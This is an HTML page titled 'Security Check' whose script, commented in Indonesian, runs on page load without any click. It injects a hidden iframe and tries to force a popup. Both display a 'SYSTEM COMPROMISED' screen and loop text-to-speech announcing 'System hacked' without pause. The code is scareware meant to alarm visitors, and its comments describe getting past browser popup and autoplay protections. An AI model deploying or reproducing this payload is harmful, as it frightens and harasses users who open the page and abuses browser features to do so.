<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Check</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #111; color: #0f0; font-family: monospace; overflow: hidden; }
  iframe { display: none; }
</style>
</head>
<body>

<script>
(function () {
  'use strict';

  console.log("[!] Memulai Zero-Click TTS Loop...");

  // ============================================
  // KONTEN UNTUK ABOUT:BLANK (TTS LOOP)
  // ============================================
  var payloadHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>Critical Alert</title></head>
    <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
      <h1>SYSTEM COMPROMISED</h1>
      <p id="status">Memulai TTS Loop...</p>
      <script>
        (function() {
          var count = 0;
          var statusEl = document.getElementById('status');

          function speak() {
            if (!('speechSynthesis' in window)) return;

            var u = new SpeechSynthesisUtterance("Warning. System hacked. Loop number " + count);
            u.lang = 'en-US';
            u.rate = 1.0;
            u.volume = 1.0;

            u.onstart = function() {
              count++;
              statusEl.innerText = "Loop: " + count;
            };

            u.onend = function() {
              // LANGSUNG LOOP TANPA JEDA
              setTimeout(speak, 100); 
            };

            window.speechSynthesis.speak(u);
          }

          // Coba mulai TTS
          speak();
        })();
      <\/script>
    </body>
    </html>
  `;

  // ============================================
  // METODE 1: IFRAME INJECTION (Sering Lolos)
  // ============================================
  function injectZeroClickIframe() {
    var iframe = document.createElement('iframe');
    iframe.allow = "autoplay";
    iframe.style.display = "none";
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);

    iframe.onload = function() {
      try {
        var doc = iframe.contentDocument || iframe.contentWindow.document;
        doc.open();
        doc.write(payloadHTML);
        doc.close();
        console.log("[!] Payload TTS disuntikkan ke iframe about:blank.");
      } catch(e) {
        console.log("[X] Gagal inject iframe: " + e.message);
      }
    };
  }

  // ============================================
  // METODE 2: WINDOW.OPEN POPUP (Zero-Click)
  // ============================================
  function forceZeroClickPopup() {
    // Mencoba membuka tab baru tanpa klik
    var win = window.open('about:blank', '_blank');
    
    if (!win) {
      console.log("[X] Popup diblokir oleh browser (Transient Activation dibutuhkan).");
      return;
    }

    try {
      win.document.open();
      win.document.write(payloadHTML);
      win.document.close();
      console.log("[!] Payload TTS disuntikkan ke Popup Window.");
    } catch(e) {
      console.log("[X] Gagal menulis ke popup: " + e.message);
    }
  }

  // ============================================
  // EKSEKUSI (Zero-Click Trigger)
  // ============================================
  
  // Coba Iframe (Biasanya berhasil tanpa memicu popup blocker)
  injectZeroClickIframe();

  // Coba Popup (Mungkin diblokir jika tidak ada gesture)
  setTimeout(function() {
    forceZeroClickPopup();
  }, 1000);

})();
</script>
</body>
</html>
